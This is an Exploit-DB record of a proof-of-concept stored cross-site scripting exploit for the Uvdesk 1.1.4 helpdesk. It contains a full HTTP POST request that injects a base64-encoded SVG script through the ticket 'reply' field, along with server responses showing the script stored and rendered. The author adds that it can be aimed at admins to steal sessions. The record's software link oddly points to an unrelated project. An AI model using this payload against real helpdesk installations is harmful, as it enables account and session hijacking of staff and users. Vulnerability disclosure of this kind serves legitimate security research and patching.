{"source": "https://www.exploit-db.com/exploits/51696", "vulnName": "Uvdesk 1.1.4 - Stored XSS (Authenticated)", "vulnEDBID": "51696", "vulnCVE": "N/A", "author": "HUBERT WOJCIECHOWSKI", "exploitType": "WEBAPPS", "platform": "PHP", "datePublished": "2023-08-24", "vulnContent": "# Exploit Title: Uvdesk 1.1.4 - Stored XSS (Authenticated)\n# Date: 14/08/2023\n# Exploit Author: Hubert Wojciechowski\n# Contact Author: hub.woj12345@gmail.com\n# Vendor Homepage: https://www.uvdesk.com/\n# Software Link: https://github.com/MegaTKC/AeroCMS\n# Version: 1.1.4\n# Testeted on: Windows 10 using XAMPP, Apache/2.4.48 (Win64) OpenSSL/1.1.1l PHP/7.4.23\n\n# Authenticated user privilages to tickets. User can send XSS to admin or other user and stolen sesssion.\n\n## Example XSS Stored in new ticket\n\n-----------------------------------------------------------------------------------------------------------------------\nParam: reply\n-----------------------------------------------------------------------------------------------------------------------\nReq\n-----------------------------------------------------------------------------------------------------------------------\n\nPOST /uvdesk/public/en/member/thread/add/1 HTTP/1.1\nHost: 127.0.0.1\nContent-Length: 812\nCache-Control: max-age=0\nsec-ch-ua: \nsec-ch-ua-mobile: ?0\nsec-ch-ua-platform: \"\"\nUpgrade-Insecure-Requests: 1\nOrigin: http://127.0.0.1\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryXCjJcGbgZxZWLsSk\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.110 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: navigate\nSec-Fetch-User: ?1\nSec-Fetch-Dest: document\nReferer: http://127.0.0.1/uvdesk/public/en/member/ticket/view/1\nAccept-Encoding: gzip, deflate\nAccept-Language: pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7\nCookie: uv-sidebar=0; PHPSESSID=4b0j3r934245lpssq5lil3edm3\nConnection: close\n\n------WebKitFormBoundaryXCjJcGbgZxZWLsSk\nContent-Disposition: form-data; name=\"threadType\"\n\nforward\n------WebKitFormBoundaryXCjJcGbgZxZWLsSk\nContent-Disposition: form-data; name=\"status\"\n\n\n------WebKitFormBoundaryXCjJcGbgZxZWLsSk\nContent-Disposition: form-data; name=\"subject\"\n\naaaa\n------WebKitFormBoundaryXCjJcGbgZxZWLsSk\nContent-Disposition: form-data; name=\"to[]\"\n\ntest@local.host\n------WebKitFormBoundaryXCjJcGbgZxZWLsSk\nContent-Disposition: form-data; name=\"reply\"\n\n%3Cp%3E%3Cembed+src%3D%22data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxuczpzdmc9Imh0dH+A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv+MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs+aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw+IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI%2BYWxlcnQoIlh+TUyIpOzwvc2NyaXB0Pjwvc3ZnPg%3D%3D%22+type%3D%22image%2Fsvg%2Bxml%22+width%3D%22300%22+height%3D%22150%22%3E%3C%2Fembed%3E%3C%2Fp%3E\n------WebKitFormBoundaryXCjJcGbgZxZWLsSk\nContent-Disposition: form-data; name=\"pic\"; filename=\"\"\nContent-Type: application/octet-stream\n\n\n------WebKitFormBoundaryXCjJcGbgZxZWLsSk\nContent-Disposition: form-data; name=\"nextView\"\n\nstay\n------WebKitFormBoundaryXCjJcGbgZxZWLsSk--\n\n\n-----------------------------------------------------------------------------------------------------------------------\nRes:\n-----------------------------------------------------------------------------------------------------------------------\n\nHTTP/1.1 302 Found\nDate: Mon, 14 Aug 2023 11:33:26 GMT\nServer: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29\nX-Powered-By: PHP/7.4.29\nCache-Control: max-age=0, must-revalidate, private\nLocation: /uvdesk/public/en/member/ticket/view/1\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Methods: GET,POST,PUT,OPTIONS\nAccess-Control-Allow-Headers: Access-Control-Allow-Origin\nAccess-Control-Allow-Headers: Authorization\nAccess-Control-Allow-Headers: Content-Type\nX-Debug-Token: bf1b73\nX-Debug-Token-Link: http://127.0.0.1/uvdesk/public/_profiler/bf1b73\nX-Robots-Tag: noindex\nExpires: Mon, 14 Aug 2023 11:33:26 GMT\nSet-Cookie: sf_redirect=%7B%22token%22%3A%22bf1b73%22%2C%22route%22%3A%22helpdesk_member_add_ticket_thread%22%2C%22method%22%3A%22POST%22%2C%22controller%22%3A%7B%22class%22%3A%22Webkul%5C%5CUVDesk%5C%5CCoreFrameworkBundle%5C%5CController%5C%5CThread%22%2C%22method%22%3A%22saveThread%22%2C%22file%22%3A%22C%3A%5C%5Cxampp2%5C%5Chtdocs%5C%5Cuvdesk%5C%5Cvendor%5C%5Cuvdesk%5C%5Ccore-framework%5C%5CController%5C%5CThread.php%22%2C%22line%22%3A44%7D%2C%22status_code%22%3A302%2C%22status_text%22%3A%22Found%22%7D; path=/; httponly; samesite=lax\nConnection: close\nContent-Type: text/html; charset=UTF-8\nContent-Length: 398\n\n<!DOCTYPE html>\n<html>\n    <head>\n        <meta charset=\"UTF-8\" />\n        <meta http-equiv=\"refresh\" content=\"0;url='/uvdesk/public/en/member/ticket/view/1'\" />\n\n        <title>Redirecting to /uvdesk/public/en/member/ticket/view/1</title>\n    </head>\n    <body>\n        Redirecting to <a href=\"/uvdesk/public/en/member/ticket/view/1\">/uvdesk/public/en/member/ticket/view/1</a>.\n    </body>\n</html>\n-----------------------------------------------------------------------------------------------------------------------\nRedirect and view response:\n-----------------------------------------------------------------------------------------------------------------------\nHTTP/1.1 200 OK\nDate: Mon, 14 Aug 2023 11:44:14 GMT\nServer: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29\nX-Powered-By: PHP/7.4.29\nCache-Control: max-age=0, must-revalidate, private\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Methods: GET,POST,PUT,OPTIONS\nAccess-Control-Allow-Headers: Access-Control-Allow-Origin\nAccess-Control-Allow-Headers: Authorization\nAccess-Control-Allow-Headers: Content-Type\nX-Debug-Token: 254ce8\nX-Debug-Token-Link: http://127.0.0.1/uvdesk/public/_profiler/254ce8\nX-Robots-Tag: noindex\nExpires: Mon, 14 Aug 2023 11:44:14 GMT\nConnection: close\nContent-Type: text/html; charset=UTF-8\nContent-Length: 300607\n\n<!DOCTYPE html>\n<html>\n    <head>\n        <title>#1 vvvvvvvvvvvvvvvvvvvvv</title>\n[...]\n<p><embed src=\"data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==\" type=\"image/svg+xml\" width=\"300\" height=\"150\"></embed></p>\n[...]\n-----------------------------------------------------------------------------------------------------------------------\n\nXSS execute, we can reply ticket to victim. This payload can use in new articles, tickets, all application.\n            "}